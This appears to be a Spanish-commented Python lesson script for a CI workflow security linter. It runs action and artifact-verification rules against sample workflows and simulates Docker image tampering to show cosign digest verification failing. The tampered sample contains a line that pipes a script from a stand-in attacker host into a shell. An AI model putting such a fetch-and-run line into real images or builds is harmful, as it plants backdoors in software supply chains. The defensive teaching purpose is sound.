#!/usr/bin/env python3
"""
Ejecuta las reglas REALES de Zenith Engine para R1007 (engine/rules/actions.py)
y R1010 (engine/rules/artifacts.py). R1008 normalmente llama a la API de
GitHub (un GET por accion) para comprobar que existe; aqui se sustituye por
un mock local determinista para que la leccion funcione sin red -- se marca
explicitamente como mock, no como el codigo real de R1008.

Ademas simula que pasa con la integridad de un artefacto Docker publicado
sin firmar frente a uno firmado con cosign.
"""
import hashlib
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

from engine.parser import parse_workflow, find_line
from engine.rules.actions import check_unverified_action_1007
from engine.rules.artifacts import check_missing_artifact_verification_1010

# Mock de "qué acciones existen realmente" en vez de llamar a la API real de
# GitHub (así R1008 no depende de red ni de rate limits para esta lección).
KNOWN_EXISTING_ACTIONS = {
    'actions/checkout', 'actions/setup-node', 'docker/build-push-action', 'docker/login-action',
    'sigstore/cosign-installer', 'totally-random-dev/dockerfile-lint-action',
}


def print_alert(alert):
    print(f"  [{alert['severity']:8s}] {alert['rule_id']}  línea {alert['line']}: {alert['description']}")


def check_action_not_in_marketplace_mock(workflow, lines):
    """Mismo criterio que R1008 real, pero contra KNOWN_EXISTING_ACTIONS en
    vez de una llamada HTTP a api.github.com/repos/.../action.yml."""
    alerts = []
    for job_name, job in workflow.get('jobs', {}).items():
        for step in job.get('steps', []):
            uses = step.get('uses', '')
            if not uses or uses.startswith('./') or '/' not in uses:
                continue
            action = uses.split('@')[0] if '@' in uses else uses
            if action not in KNOWN_EXISTING_ACTIONS:
                alerts.append({
                    'rule_id': 'R1008 (mock offline)', 'severity': 'LOW',
                    'line': find_line(lines, uses),
                    'description': f'No se encontró "{action}" en el mock de acciones conocidas (¿typo? ¿typosquatting?).',
                })
    return alerts


def analyze(path):
    print(f'\n=== {path.name} ===')
    workflow, lines = parse_workflow(str(path))

    alerts = (
        check_unverified_action_1007(workflow, lines, lang='es')
        + check_action_not_in_marketplace_mock(workflow, lines)
        + check_missing_artifact_verification_1010(workflow, lines, lang='es')
    )
    if not alerts:
        print('  Sin hallazgos AIW.')
        return
    for alert in sorted(alerts, key=lambda a: a['line']):
        print_alert(alert)


def simulate_artifact_tampering():
    print('\n=== Simulación: integridad del artefacto publicado ===')

    original = b'FROM ubuntu:24.04\nCOPY app /app\nENTRYPOINT ["/app"]\n'
    tampered = b'FROM ubuntu:24.04\nCOPY app /app\nRUN curl -s https://attacker.example/backdoor.sh | sh\nENTRYPOINT ["/app"]\n'

    digest_build_time = hashlib.sha256(original).hexdigest()
    digest_after_tampering = hashlib.sha256(tampered).hexdigest()

    print('  Digest de la imagen en el momento del build (cosign firma ESTE digest):')
    print(f'    sha256:{digest_build_time}')
    print('  Digest de la imagen tras una manipulación simulada en el registry:')
    print(f'    sha256:{digest_after_tampering}')

    print('\n  Sin firma (vulnerable.yml):')
    print('    docker pull myorg/myimage:latest   -> éxito, sin ningún aviso. La imagen manipulada se usa igual.')

    print('\n  Con firma cosign (fixed.yml):')
    if digest_build_time != digest_after_tampering:
        print('    cosign verify myorg/myimage@sha256:<digest_actual_en_el_registry>')
        print('    -> el digest firmado no coincide con el digest publicado: VERIFICACIÓN FALLIDA, se rechaza la imagen.')


def main():
    base = Path(__file__).parent
    analyze(base / 'vulnerable.yml')
    analyze(base / 'fixed.yml')
    simulate_artifact_tampering()


if __name__ == '__main__':
    sys.exit(main())
